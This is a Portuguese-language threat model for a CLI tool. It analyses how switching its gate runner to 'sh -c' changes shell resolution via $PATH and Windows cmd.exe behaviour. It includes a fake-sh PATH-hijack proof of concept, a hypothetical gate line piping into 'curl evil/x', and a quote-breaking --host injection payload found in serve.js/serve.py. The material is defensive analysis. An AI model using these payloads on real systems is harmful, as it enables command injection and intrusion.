---
status: draft
date: 2026-09-01
author: "hades-tf"
ml: "ML-0A"
roadmap: "docs/roadmaps/wip/ROADMAP-2026-09-01-os-3-clis-executam-gate-de-wave-com-sh-c.md"
req: "docs/req/REQ-2026-09-01-mesmo-gate-de-wave-da-vereditos-diferentes-conforme-o-cli-que-executa-o-barrier.md"
adr: "docs/adr/ADR-2026-09-01-gate-de-wave-e-contrato-portavel-em-shell-posix-nao-script-do-sistema-operacional.md"
---

# Modelo de ameaça: troca do shell de gate (`shell:true`/`shell=True` → `sh -c`)

> ML-0A da Wave 0. Nenhuma linha de implementação foi escrita para produzir este documento —
> evidência abaixo (números de linha, trechos) foi obtida só por leitura de `internal/`, `npm/src/`,
> `pypi/trackfw/`.

## 1. A troca amplia superfície de execução?

**Veredito: sim — de forma pequena, mas real e medida, mesmo em POSIX, além da ressalva de Windows.**
Corrigido nesta revisão: a primeira versão deste parecer concluiu "não" a partir de leitura de código
(supondo que `shell:true`/`shell=True` já resolvem `sh` do mesmo jeito que `exec.Command("sh","-c",..)`);
medido a seguir (§1a), a conclusão virou "sim, pequeno".

**O que já é verdade hoje, antes de qualquer fix:**

- Go executa conteúdo arbitrário do bloco `Gates da wave:` via `sh -c` **desde sempre**
  (`internal/commands/barrier.go:729`, `runGateCommand`). Não há mudança de capacidade no Go.
- Node e Python já executam o mesmo conteúdo via `shell: true` / `shell=True`
  (`npm/src/commands/barrier.js:560`, `pypi/trackfw/commands/barrier.py:580-582`). Em POSIX
  (macOS/Linux), `child_process.spawnSync(cmd, {shell:true})` e `subprocess.run(cmd, shell=True)`
  **já invocam um shell** para interpretar o comando — não há mudança de *capacidade sintática* em
  POSIX, em nenhum dos 3 CLIs: os 83 idiomas medidos já são interpretados hoje.
- O vetor "conteúdo do roadmap → execução de processo" **já existe desde o dia 1** nos 3 CLIs; a REQ
  não introduz essa capacidade, reencaminha qual shell a interpreta.

### 1a. Medição — resolução de `sh`: caminho fixo (`shell:true`) vs. `$PATH` (`sh -c` explícito)

**Correção após medição — a primeira versão deste parecer errou aqui.** Eu havia escrito que a troca
é "um no-op em macOS/Linux" porque supus, por leitura, que `shell:true`/`shell=True` já resolvem
`sh` da mesma forma que `exec.Command("sh", "-c", cmd)`. **Medi e é falso.** PoC reproduzível
(shell `sh` falso injetado no início do `$PATH`, imprime um marcador e reexecuta `/bin/sh` de
verdade — reexecutável em uma colagem única):

```sh
mkdir -p /tmp/fakesh
printf '#!/bin/sh\necho FAKE-SH-RAN >&2\nexec /bin/sh "$@"\n' > /tmp/fakesh/sh
chmod +x /tmp/fakesh/sh

PATH=/tmp/fakesh:$PATH node -e "const{spawnSync}=require('child_process');spawnSync('echo hi',{shell:true,stdio:'inherit'})"
PATH=/tmp/fakesh:$PATH node -e "const{spawnSync}=require('child_process');spawnSync('sh',['-c','echo hi'],{stdio:'inherit'})"
PATH=/tmp/fakesh:$PATH python3 -c "import subprocess;subprocess.run('echo hi',shell=True)"
PATH=/tmp/fakesh:$PATH python3 -c "import subprocess;subprocess.run(['sh','-c','echo hi'])"
```

Resultado observado (rodado nesta sessão, macOS):

```
PATH=/tmp/fakesh:$PATH node -e "spawnSync('echo hi',{shell:true,...})"        → NÃO roda o fake (pinado em /bin/sh)
PATH=/tmp/fakesh:$PATH node -e "spawnSync('sh',['-c','echo hi'])"             → RODA o fake (resolvido via $PATH)
PATH=/tmp/fakesh:$PATH python3 -c "subprocess.run('echo hi',shell=True)"      → NÃO roda o fake (pinado em /bin/sh)
PATH=/tmp/fakesh:$PATH python3 -c "subprocess.run(['sh','-c','echo hi'])"     → RODA o fake (resolvido via $PATH)
```

**Node's `shell:true` e Python's `shell=True` são pinados no caminho absoluto `/bin/sh`.**
`exec.Command("sh", "-c", cmd)` do Go — e o que a Wave 1 vai escrever para Node/Python
(`spawnSync('sh', [...])` / `subprocess.run(["sh", ...])`) — **resolve `sh` via `$PATH`** (Go via
`exec.LookPath`, Node/Python via a busca de `PATH` do próprio SO quando o primeiro argumento não
contém `/`). Isso é uma mudança real de superfície em POSIX, independente do Windows: **quem
controla a ordem de `$PATH` do processo que roda `trackfw barrier` passa a controlar qual binário
interpreta o conteúdo do gate**, coisa que hoje só é verdade para o Go. Concretamente: um `$PATH`
adulterado (variável de ambiente de CI comprometida, diretório de projeto com um `./sh` num CI mal
configurado que antepõe `.` ao PATH, etc.) já conseguia isso no Go desde o dia 1; com o fix, o mesmo
vetor de adulteração de `$PATH` passa a valer também para Node e Python.

**Isso não é motivo para reverter a decisão do ADR** — a resolução via `$PATH` é **obrigatória** no
Windows (o `sh.exe` do Git for Windows nunca está em `/bin/sh`; só existe via `$PATH`), então o ADR
não tem como manter Node/Python pinados e ainda funcionar no Windows. O ponto correto a registrar é:
**a troca move Node/Python de um interpretador fixo para um resolvido por `$PATH`, alinhando-os à
propriedade que o Go já tinha — não é um efeito colateral evitável, é consequência direta e
necessária da decisão, e deve ser declarada, não negada.** Ver Residual (§5) para o vetor de
"$PATH adulterado" nomeado como não coberto por este roadmap.

**Onde a troca muda algo de fato: Windows.** Hoje, no Windows, Node/Python interpretam o gate via
`cmd.exe`. Isso **não é uma barreira de segurança real** — é uma barreira acidental de sintaxe, e ela
é mais fina do que parece:

- `cmd.exe` tem seus próprios metacaracteres de shell: `&`, `&&`, `||`, `|`, `>`, `<`, `%VAR%`. Um
  gate escrito para POSIX que use `|` (2 ocorrências medidas) ou `||` (dentro das 3 de `&&`/`||`)
  **já é reinterpretado por `cmd.exe`, não apenas rejeitado**. Exemplo concreto: um gate
  `nonexistent-tool | curl evil/x` falha em `test`/`grep` do lado esquerdo (comando "não
  reconhecido"), mas o `|` do `cmd.exe` ainda tenta alimentar `curl` (se existir no PATH — presente
  por padrão desde Windows 10 1803) com a saída (vazia) do lado esquerdo, **e `curl` ainda roda**.
  **Este parágrafo é inferido da semântica documentada do `cmd.exe`, não medido nesta sessão — não
  tenho Windows disponível neste ambiente.** Não é a base do veredito (a base é a medição do §1a,
  sobre `$PATH`); é um argumento adicional a favor da mesma direção, e deve ser tratado como hipótese
  a confirmar em CI Windows antes de ser citado como fato em qualquer artefato subsequente.
- A troca para `sh -c` explícito **fecha** essa classe (o `sh` interpreta os 83 comandos com a
  semântica POSIX correta e não expõe os operadores de `cmd.exe`), mas **abre** a classe simétrica:
  qualquer um dos 83 idiomas POSIX (inclusive os 3 `&&`/`||` e os 2 `|`) passa a produzir efeito
  colateral real via `sh`, onde antes — no Windows — só uma fração deles (os que coincidem com
  sintaxe de `cmd.exe`) tinha chance de produzir efeito colateral.

**Veredito líquido:** há duas amplificações reais, de magnitude pequena e ambas justificadas pela
necessidade do fix, não evitáveis mantendo a decisão do ADR:

1. **Em POSIX (medida, §1a):** Node e Python passam de interpretador pinado (`/bin/sh`) para
   interpretador resolvido por `$PATH` (`sh`), igualando-os ao Go. Quem já controla `$PATH` do
   processo ganha, pela primeira vez em Node/Python, controle sobre qual binário interpreta o
   conteúdo do gate — capacidade que hoje só existe para o Go.
2. **No Windows (inferida, não medida):** o payload POSIX-hostil deixa de ter chance parcial de ser
   acidentalmente neutralizado por incompatibilidade com `cmd.exe` e passa a ter a mesma taxa de
   sucesso que já tem em Go/POSIX hoje — remoção de uma mitigação que nunca foi projetada como
   controle de segurança.

Nenhuma das duas é motivo para reverter o ADR: (1) é a mesma resolução via `$PATH` que o Windows
exige estruturalmente (`sh.exe` do Git for Windows só existe via `$PATH`), então "não resolver via
`$PATH`" não é uma opção que preserve o objetivo da REQ; (2) é exatamente a inversão que o ADR já
nomeia ("o divergente é o correto") aplicada à superfície de ataque, não só à corretude funcional —
**o Windows deixa de ter uma mitigação acidental, e Node/Python em POSIX ganham a mesma propriedade
de resolução por `$PATH` que o Go já tinha.** Ambas devem ser declaradas no contrato (`docs/cli-parity.md`
da Wave 2), não tratadas como não-eventos.

**A ressalva que compõe com REQ aberta:** `roadmapTrustForGates` (`barrier.go:646-722`,
espelhado em Node/Python) já **falha aberto** (`trusted: true`) quando `git rev-parse` falha (não é
repo git), quando o topo do repo não pode ser determinado, ou quando `git show origin/main:<path>`
falha por motivo diferente de "arquivo não existe" (origin não configurado, ref não buscada) — isso
**já tem REQ própria aberta por fail-open**, citada no roadmap. Essa REQ e esta compõem: um executor
CI Windows self-hosted onde `origin` não está configurado (fail-open de trust) **e** que tenha `sh.exe`
no PATH (Git for Windows, WSL) passa, com este fix, a executar POSIX-hostil com fidelidade total —
onde antes tinha só a chance parcial de `cmd.exe` descrita acima. **Não é superfície nova em
abstrato — é a primeira vez que duas superfícies fail-open independentes (trust E shell) se alinham
na mesma plataforma sem nenhuma mitigação acidental de sintaxe no meio.** Recomendo registrar essa
composição como residual explícito na Wave 1/2, não resolvê-la aqui — a REQ de fail-open do trust é
o lugar certo para o fix, não esta.

## 2. O lado seguro de "não pôde ser avaliado" — o argumento

**Escolha: fail-closed.** `sh` ausente deve produzir um estado que, na agregação, bloqueia a wave —
não que a aprove silenciosamente. Três linhas de argumento, nenhuma delas "porque sim":

**2.1 — O projeto já decidiu isso, no mesmo arquivo, para o mesmo tipo de situação.** O check de
confiança (`roadmapTrustForGates`) já enfrenta exatamente esta escolha — "não posso confirmar que o
conteúdo é confiável" — e já resolveu para fail-closed **quando a causa é "arquivo não existe em
origin/main" ou "conteúdo diverge"**: reporta `status: "not_evaluated"` (não `"passed"`, não
`"blocked"` — um terceiro rótulo), com uma `failureMsg` que nomeia o remédio (`--trust-local-gates`),
e essa terceira label **já** faz `gatesOK = false` na agregação — confirmado nos 3 CLIs, não só
lido: Go (`barrier.go:872`), Node (`barrier.js:592`, `status = checks.every(c => c.status ===
'passed') ? 'passed' : 'blocked'`) e Python (`barrier.py:688`, `status = "passed" if all(c["status"]
== "passed" for c in checks) else "blocked"`, com `sys.exit(0 if doc["status"] == "passed" else 1)`
em `barrier.py:747` — mesmo formato do `doc.status === 'passed' ? 0 : 1` do Node). Ou seja: **o
padrão "estado distinto de pass/block, mas que ainda bloqueia a wave, com
mensagem nomeando o remédio" já existe, já está testado, e já é exatamente o que a AC4 pede.** A
escolha certa para "`sh` ausente" não é inventar um quarto estado — é **reusar literalmente o mesmo
`not_evaluated`**, só trocando a `failureMsg` para o texto sobre instalar shell POSIX que a AC3 exige.
Isso também resolve a AC4 sem exigir um novo código de saída: o exit code 2 (`usageExit`) já está
reservado para erro de resolução (roadmap/wave não encontrados) — colocar "sh ausente" ali colidiria
com esse contrato existente. Manter "sh ausente" como um `gates: not_evaluated` que blinda a wave via
o exit 1 existente ("blocked") preserva os dois contratos: exit 2 = "não consegui nem começar a
avaliar o pedido", exit 1 = "avaliei (integralmente ou em parte) e o resultado não é aprovação",
exit 0 = "avaliei tudo e passou". Distinguir a **mensagem/rótulo** ("not_evaluated" com texto
nomeando o remédio) sem inventar um terceiro código de saída é a leitura mais conservadora do
contrato já publicado — mas é uma recomendação de desenho para a Wave 1, não uma imposição: quem
implementar pode decidir por um exit code novo se achar que o consumo por CI/scripts precisa
diferenciar programaticamente "not_evaluated" de "blocked" sem parsear JSON; friso que hoje **nenhum
consumidor faz essa diferenciação por exit code** mesmo para o trust check, que já tem o mesmo
problema — então introduzir um exit code novo só para `sh` ausente, sem fazer o mesmo para trust,
seria inconsistente.

**2.2 — Assimetria de recuperabilidade e de custo por ocorrência.** Falso negativo (bloquear
trabalho legítimo num ambiente sem `sh`) custa minutos e é uma ação **do lado de quem está
bloqueado**: instalar Git Bash, usar WSL, ou — se o ambiente genuinamente não pode ter shell POSIX —
o próprio ADR já define que a mensagem nomeia o remédio (AC3), e nada impede um mecanismo de escape
explícito e auditável no nível do produto (fora do escopo deste documento, mas simétrico ao
`--trust-local-gates` que já existe para o trust check). Falso positivo (tratar "não consegui medir"
como "passou") tem custo assimétrico: a wave já foi liberada, o `barrier` já reportou verde, e — pelo
próprio uso do `barrier` como critério de aceite de release/ship — decisões subsequentes (merge, tag,
deploy) já podem ter sido tomadas **sobre um gate que nunca rodou**. Não há como "desligar" essas
decisões depois. É a mesma classe de falha nomeada repetidamente nesta sessão: **ausência de medição
tratada como medição favorável.** A ocorrência é rara (só dispara quando `sh` genuinamente falta) mas
o custo, quando ocorre, é dessa classe não-recuperável.

**2.3 — Quem sofre cada erro tem alavancas diferentes.** Quem sofre o falso negativo é o único
operador do próprio ambiente — pode instalar o shell, ou reportar ao mantenedor que o requisito é
inviável no seu contexto (dado concreto para revisar a decisão). Quem sofre o falso positivo é
qualquer consumidor a jusante do artefato liberado (revisor que confia no ✅ do CI, usuário do
pacote publicado) — não tem visibilidade de que o gate nunca rodou, e não tem alavanca para pedir a
reavaliação porque não sabe que ela é necessária. Bloquear erra a favor de quem pode agir; aprovar
silenciosamente erra a favor de ninguém em particular e contra todos a jusante.

## 3. Falsificação simétrica — ambientes legítimos sem `sh`, nomeados

Um `barrier` que passe a **recusar ambiente legítimo** troca um defeito por outro; nomear é
obrigatório, não retórico:

- **Windows sem Git for Windows/WSL/Cygwin instalado.** Citado no próprio ADR como consequência
  assumida — é a população central afetada. Inclui GitHub Actions self-hosted Windows runners
  configurados como "PowerShell only" e agentes corporativos hardened. (`windows-latest` **hospedado
  pela GitHub já vem com Git Bash** — não afetado; o afetado é self-hosted mínimo.)
- **Imagens de contêiner `distroless`/`scratch`** usadas por alguns runners de CI para builds
  hermeticamente mínimos (ex.: `gcr.io/distroless/*`, `FROM scratch` com binário estático) — sem
  `/bin/sh`, diferente de Alpine (que tem `sh` via busybox por padrão). Se `trackfw barrier` for
  invocado dentro de um contêiner assim (não no host que orquestra o contêiner), o `sh` genuinamente
  não existe.
- **Windows Server Core em modo mínimo** (sem shell UNIX-like nenhum), usado em alguns pipelines
  .NET/Azure DevOps legados.

Para os dois primeiros casos POSIX-adjacentes (Linux minimalista, distroless), a régua correta não é
"falha porque não tem sh" e sim confirmar que **nenhum ambiente Linux/macOS convencional** é afetado
— `/bin/sh` é POSIX-mandatório em qualquer distro que se pretenda utilizável como runner de CI
genérico; só builds propositalmente minimalistas (distroless, scratch) removem esse binário. Isso
é uma população pequena e, tipicamente, de quem já opta conscientemente por minimalismo extremo —
mitigável documentando a exigência (§ "Consequência assumida" do ADR já cobre isso para Windows;
recomendo estender a mesma frase para citar distroless/scratch explicitamente na Wave 1/2, não só
Windows).

## 4. Enumeração — todo ponto onde conteúdo de artefato versionado vira processo, nos 3 CLIs

Varredura completa por `exec.Command`, `spawnSync`/`spawn`/`execSync`/`exec`/`child_process`,
`subprocess.*`/`os.system`/`shell=True` nos três diretórios de produto. Resultado, classificado:

**4.1 — O ponto que a REQ endereça (conteúdo de roadmap → shell):**

| CLI | Local | Shell hoje |
|---|---|---|
| Go | `internal/commands/barrier.go:729` (`runGateCommand`) | `sh -c` (já correto) |
| Node | `npm/src/commands/barrier.js:560` (`evalGates`) | `shell: true` → shell do SO |
| Python | `pypi/trackfw/commands/barrier.py:580-582` (loop de `commands`) | `shell=True` → shell do SO |

Este é o **único** ponto, nos 3 CLIs, onde conteúdo de um artefato versionado (o bloco `Gates da
wave:` do roadmap, escrito por quem quer que tenha editado o `.md`, inclusive um PR de terceiro sob
fail-open de trust) é passado a um interpretador de shell. Confirma o escopo do ADR: não há um
segundo lugar do mesmo tipo escondido.

**4.2 — Pontos com `shell:true`/`shell=True` que NÃO recebem conteúdo de artefato (fora do escopo da
REQ, mas dentro do que a Action 4 pede para enumerar — dois pontos que a lista de dois do ADR não
cobria):**

| CLI | Local | O que é interpolado no shell | Origem do dado |
|---|---|---|---|
| Node | `npm/src/commands/serve.js:205-211` (`exec(openCmd, ...)`) | `${url}` dentro de `` `open "${url}"` ``/`` `start "" "${url}"` ``/`` `xdg-open "${url}"` `` | `displayUrl(host, port)`, e `host` vem **direto** de `opts.host` (flag `--host`, sem sanitização — confirmado lendo `displayUrl`: qualquer string que não seja IPv4/IPv6/`localhost` reconhecida é interpolada crua: `` `http://${host}:${port}` ``) |
| Python | `pypi/trackfw/commands/serve.py:196` (`subprocess.Popen(["start", url], shell=True)`, ramo Windows) | `url` | mesma origem: `args.host` (flag `--host`), via `_display_url(host, port)` |

**Achado concreto, não apenas teórico:** `--host` é uma flag de linha de comando (não conteúdo de
artefato versionado — está fora do modelo de ameaça "PR malicioso" que motiva esta REQ), mas em
Node **não há validação alguma** entre `--host` e a string interpolada em `exec()` com aspas duplas
simples. Um valor como `--host 'x"; touch /tmp/pwned; echo "'` sobrevive a `isLoopbackHost`/
`displayUrl` (cai no branch `return \`http://${host}:${port}\`` sem escaping) e chega a
`exec(\`open "${url}"\`, ...)` — quebra de aspas e injeção de comando local. É um vetor real de
injeção via shell (`exec` sem array de args), mas o atacante precisa já ter a capacidade de invocar
`trackfw serve --host <payload>` na máquina-alvo — não é um PR malicioso remoto, é auto-inflição ou
um wrapper/script que repassa `--host` de fonte não confiável para o CLI sem validar. **Fora do
escopo desta REQ** (que é sobre paridade de veredito de gate, não sobre `serve`), mas nomeado porque
a Action 4 pede exatamente isso e porque é o tipo de achado que, não registrado, custa >10min a quem
tocar `serve.js`/`serve.py` depois. Recomendo REQ própria, não tratada aqui.

**4.3 — Pontos com exec/subprocess que NÃO usam shell (argv array, sem interpretação de
metacaracteres) — confirmados seguros para este modelo de ameaça, listados para fechar a
enumeração e não deixar zona cinzenta:**

Todos os `exec.Command("git", ...)` (Go), `spawnSync('git', [...])` (Node) e
`subprocess.run(["git", ...])` (Python) em `branch.go`/`branch.js`/`branch.py`, `commit.go`/`.js`/
`.py`, `ship.go`/`.js`/`.py`, `release.go`/`.js`/`.py`, `audit_surface.go`/`audit-surface.js`/
`audit_surface.py`, `validator_git_exec.go`/`git-exec.js`/`validator.py`, e `discover.go`/`.js`/
`.py` (chamadas fixas: `npx husky init`, `npm install --save-dev husky`, `lefthook install`) —
todos passam listas de argumentos, nunca uma string montada por concatenação de conteúdo de
artefato. `adapter.CLIName` (`ship.go:211`) vem de um mapa fixo por `forge` enum (`gh`/`glab`/`az`),
não de conteúdo de artefato. Nenhum desses é reinterpretado por um shell — não afetados por esta
troca. Todos já resolvem `git`/`npx`/`npm`/`lefthook` via `$PATH` (`exec.Command`, `spawnSync`,
`subprocess.run` sem `shell=True` resolvem o primeiro argumento por `$PATH` da mesma forma nos 3
CLIs, sempre) — a resolução por `$PATH` é pré-existente e ortogonal ao vetor do §1a, que é
especificamente sobre o `sh` interpretador de gate ganhar essa propriedade em Node/Python, onde hoje
não a tem.

**Conclusão da enumeração:** a lista de dois do ADR/REQ estava correta **para o vetor que importa**
(conteúdo de artefato → shell) — não havia um terceiro ponto desse tipo escondido. Mas a Action 4
pedia "todo lugar com `shell:true`/`exec`/`spawn`", que é mais ampla que "todo lugar que recebe
conteúdo de artefato" — nessa leitura mais ampla, `serve.js`/`serve.py` são dois pontos adicionais
reais, com um vetor de injeção concreto e não documentado até este ML.

## 5. Residual

- **Não fechado por este roadmap:** o achado do §4.2 (`--host` → `exec()`/`shell=True` sem
  sanitização em `serve.js`/`serve.py`) é uma injeção de comando local real, fora do escopo desta
  REQ. Recomendo REQ própria de severidade média (requer que o operador já controle a invocação do
  CLI — não é um vetor remoto via PR) para: (a) Node, trocar `exec(string)` por
  `spawn(openBin, [url], {shell:false})` (elimina a interpolação); (b) Python, confirmar se
  `subprocess.Popen(["start", url], shell=True)` no ramo Windows tem o mesmo problema com a semântica
  de `list2cmdline` do `subprocess` do Python e corrigir de forma equivalente; (c) paridade Go
  (hoje `serve.go` nem abre browser — decidir se isso é intencional ou lacuna de paridade separada).
- **Não fechado por este roadmap:** a composição nomeada no §1 entre esta REQ e a REQ já aberta de
  fail-open do `roadmapTrustForGates`. Nenhuma mudança de código deveria ser feita em
  `roadmapTrustForGates` por esta REQ (a REQ correta já existe e é o lugar certo) — mas a Wave 1/2
  deste roadmap deveria citar essa REQ explicitamente no changelog/ADR de contrato, para que quem
  ler o histórico depois entenda que as duas se compõem e não são independentes.
- **Não fechado por este roadmap, e não deveria ser:** a lacuna entre "ambiente legítimo sem `sh`"
  (§3) e o mecanismo de escape. O ADR já decide que a mensagem nomeia o remédio (instalar shell
  POSIX); se, na prática, algum operador legítimo não puder instalar um shell POSIX (contêiner
  distroless propositalmente minimalista rodando `trackfw barrier` dentro dele, não no host), a
  Wave 1 precisa decidir se existe algum escape equivalente a `--trust-local-gates` para essa
  situação, ou se a resposta é "não rode `trackfw barrier` dentro desse contêiner, rode no host que
  o orquestra". Não tomei essa decisão aqui porque é de desenho de produto, não de modelo de ameaça
  — sinalizo que ela existe e precisa de uma resposta explícita antes do fechamento da Wave 1.
- **Não fechado por este roadmap:** o vetor de "`$PATH` adulterado" nomeado no §1a — quem controla a
  ordem de `$PATH` do processo que roda `barrier` passa a poder trocar o binário `sh` que interpreta
  o gate em Node/Python, propriedade que hoje só existe no Go. Isso já era um risco aceito para o Go
  desde o dia 1 (não é novo em abstrato); o que muda é a população exposta (3 CLIs, não 1). Não é um
  vetor de PR malicioso (exige controle do ambiente de execução, não do conteúdo do artefato), então
  fica fora do escopo desta REQ — mas deveria ser citado, com uma frase, no `docs/cli-parity.md` da
  Wave 2, para que a decisão de não fixar `sh` em caminho absoluto seja uma escolha registrada, não
  uma omissão.
- **Não fechado por este roadmap, aplicação do próprio argumento do §2 um passo adiante:** "ausência
  de medição tratada como medição negativa" também vale para **ferramentas dentro de um `sh`
  presente** (`grep`/`sed`/`awk`/`jq`/`python3` ausentes num contêiner minimalista) — não só para o
  `sh` ausente. Medido nesta sessão: `sh -c 'nosuchtool'` retorna **exit 127**, e hoje os 3 CLIs
  registram esse 127 como reprovação do gate (`exit != 0` → `blocked`/`failures`), não como "não pude
  medir". **Diferente do caso "`sh` ausente"**, porém: isso já é fail-closed hoje (127 vira
  "reprovou", nunca "passou"), então não é um buraco de segurança — é um problema de ergonomia
  (mensagem enganosa: "reprovou" quando na verdade a ferramenta não existia), fora do escopo de
  severidade desta REQ. **Recomendação de desenho para a Wave 1, não bloqueante:** ao implementar a
  detecção de "`sh` ausente" (AC4), não usar `exit code == 127` como sinal — 127 nunca aparece
  quando `sh` está ausente (Go: `*exec.Error` não-`ExitError`, cai no `return 1` de
  `runGateCommand`, `barrier.go:733`; Node: `result.status === null` com `result.error.code ===
  'ENOENT'`; Python: `FileNotFoundError`, hoje não capturado — sobe como traceback cru, não como
  relatório). O sinal correto é a falha de *spawn* do processo (erro ao iniciar o `sh`), não o
  código de saída do `sh` que rodou.
- **Recomendação de verificação, não achado de ameaça:** como o §1a mostrou que a mudança é inerte
  em macOS/Linux para o *veredito funcional* mas real para a *resolução de interpretador*, rodar a
  falsificação da AC2 (mesmo veredito nos 3 CLIs) e o teste de mensagem byte-idêntica da AC3 **só**
  num runner POSIX prova pouco sobre o defeito que a REQ existe para corrigir — o defeito é
  Windows-específico. `docs/agents-working-context.md` já registra um job `windows-full-suites` em
  uso por outra REQ recente (`fix/escrita-atomica-do-cli-python-funciona-no-windows`); recomendo que
  a Wave 1/2 exija explicitamente que a falsificação da AC2/AC3 e o fechamento da AC7 (item 7 sai de
  `REPRODUCED`) rodem nesse job Windows, não apenas localmente ou em runner Linux — senão "CI verde"
  (AC8) fica verde na plataforma onde o bug original não se manifesta.
- **Confirmado, não residual (revisado):** a mudança de shell não amplia a *sintaxe* aceita nos 83
  gates existentes em nenhuma plataforma (eles já rodavam sob `sh -c` em Go e sob shell POSIX em
  Node/Python-POSIX) — a amplificação real é estrutural, não sintática: resolução de `sh` via
  `$PATH` em vez de caminho fixo (medida, §1a) e remoção da mitigação acidental de `cmd.exe` no
  Windows (inferida, §1). Isso não bloqueia a Wave 1 — ambas são consequência necessária da decisão
  do ADR, não motivo para revertê-la — mas devem ser citadas no contrato, não tratadas como
  não-eventos.
